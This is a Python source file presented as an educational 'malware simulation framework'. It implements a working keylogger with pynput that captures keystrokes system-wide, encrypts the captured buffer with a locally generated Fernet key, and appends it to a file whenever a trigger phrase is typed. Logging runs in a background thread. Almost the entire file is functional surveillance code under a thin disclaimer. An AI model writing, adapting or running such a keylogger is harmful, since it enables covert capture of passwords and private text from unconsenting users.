"""
Malware Simulation Framework - FOR EDUCATIONAL PURPOSES ONLY

This software is designed to simulate malware behavior in a controlled environment
for educational and research purposes. DO NOT use this in a production environment
or against systems without explicit permission.


Modes:
- keylogger: Simulates keystroke logging
"""
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import os
import threading

# === 1. Load or generate encryption key ===
KEY_FILE = "encryption_key.key"
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()

cipher = Fernet(key)

# === 2. Variables ===
log_buffer = ""
log_file = "keystrokes.enc"
trigger_phrase = "test123"

# === 3. On key press ===
def on_press(key):
    global log_buffer
    
    # Exit condition - press esc key to exit
    if key == keyboard.Key.esc:
        print("[*] Stopping keylogger...")
        return False
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        elif key == keyboard.Key.space:
            log_buffer += ' '
        elif key == keyboard.Key.enter:
            log_buffer += '\n'
    except AttributeError:
        pass
    
    if trigger_phrase in log_buffer:
        encrypted = cipher.encrypt(log_buffer.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted + b"\n")
        print(f"[+] Logged: {log_buffer}")
        log_buffer = ""


# === 4. Start Listener ===
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        print("[*] Listening for keystrokes... Type 'test123' to trigger logging.")
        listener.join()

# Run keylogger in a separate thread
def run_keylogger():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    return keylogger_thread
